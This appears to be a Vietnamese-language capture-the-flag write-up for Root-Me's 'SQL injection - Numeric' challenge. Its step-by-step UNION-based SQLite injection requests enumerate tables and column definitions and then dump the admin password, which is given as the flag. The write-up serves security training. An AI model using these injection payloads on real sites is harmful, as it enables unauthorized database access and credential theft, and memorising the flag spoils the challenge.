# [SQL injection - Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)

## Solutions

Integer injection

Xuất hiện lỗi khi request `GET /web-serveur/ch18/?action=news&news_id=2'`, có lỗi `SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "\" in`

Khai thác:

- `GET /web-serveur/ch18/?action=news&news_id=1+ORDER+BY+100+--`:
  - Response: `ORDER BY term out of range - should be between 1 and 3`
  - => số cột là 3
- `GET /web-serveur/ch18/?action=news&news_id=1+UNION+SELECT+1,+2,+3+FROM+sqlite_master+--`:
  - chỉ hiển thị số 2 và 3
- `GET /web-serveur/ch18/?action=news&news_id=1+UNION+SELECT+1,+name,+3+FROM+sqlite_master+--`:
  - biết được có bảng `news` và `users`
- `GET /web-serveur/ch18/?action=news&news_id=1+UNION+SELECT+1,+name,+NULL+FROM+PRAGMA_TABLE_INFO('users') --`:
  - `unrecognized token: "\" in`
  - bị lỗi do `'` bị escaped, => không tìm được tên cột theo cách cũ
- `GET /web-serveur/ch18/?action=news&news_id=1+UNION+SELECT+NULL,+sql,+name+FROM+sqlite_master+--`:
  - `CREATE TABLE news(id INTEGER, title TEXT, description TEXT)`
  - `CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)`
  - => có được tên các cột của bảng users
- `GET /web-serveur/ch18/?action=news&news_id=1+UNION+SELECT+NULL,+username,+password+FROM+users--`:

  ```html
  <b>admin</b><br/><p>aTlkJYLjcbLmue3</p>
  ```

Flag: `aTlkJYLjcbLmue3`
